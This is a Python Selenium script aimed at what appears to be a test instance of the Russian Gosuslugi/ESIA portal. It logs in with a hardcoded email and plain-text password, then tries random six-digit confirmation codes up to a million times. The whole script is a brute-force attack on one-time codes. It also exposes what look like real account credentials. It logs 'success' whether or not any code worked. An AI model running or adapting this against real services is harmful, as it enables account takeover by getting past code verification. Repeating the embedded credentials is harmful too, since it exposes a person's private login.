import random

import selenium.common
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import logging
import pytest
import math

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s [%(name)s]: %(message)s')
def calc(x):
  return str(math.log(abs(12*math.sin(int(x)))))

try:
    logging.info('Запуск скрипта')
    link = 'https://esia-portal1.test.gosuslugi.ru/profile/user/personal/edit'
    browser = webdriver.Chrome()
    browser.get(link)

    input_loggin = browser.find_element(By.CSS_SELECTOR, 'input[id="login"]')
    input_loggin.send_keys('martikhin.ia@gmail.com')
    input_password = browser.find_element(By.CSS_SELECTOR, 'input[id="password"]')
    input_password.send_keys('G8_ntM!9PaAkxTg')
    button_1 = browser.find_element(By.CSS_SELECTOR, 'div.mt-40 button.plain-button')
    button_1.click()
    time.sleep(1)
    button = browser.find_element(By.CSS_SELECTOR, 'button.acc-set-btn')
    button.click()
    logging.info('Я дошел до кода')
    time.sleep(2)
    for i in range(10*10*10*10*10*10):
        i = random.randint(0,999999)
        browser.find_element(By.CSS_SELECTOR, 'input[id="confirmCode"]').clear()
        a = str(i)
        logging.info(a)
        if len(a) < 6:
            i = (6-len(a))*"0"+a

        logging.info(str(i))
        input_loggin = browser.find_element(By.CSS_SELECTOR, 'input[id="confirmCode"]')
        input_loggin.send_keys(str(i))
        time.sleep(0.5)
        button_3 = browser.find_element(By.CSS_SELECTOR, 'button.accept-button')
        button_3.click()
        time.sleep(0.5)

finally:
    logging.info(f'Успех')
    browser.quit()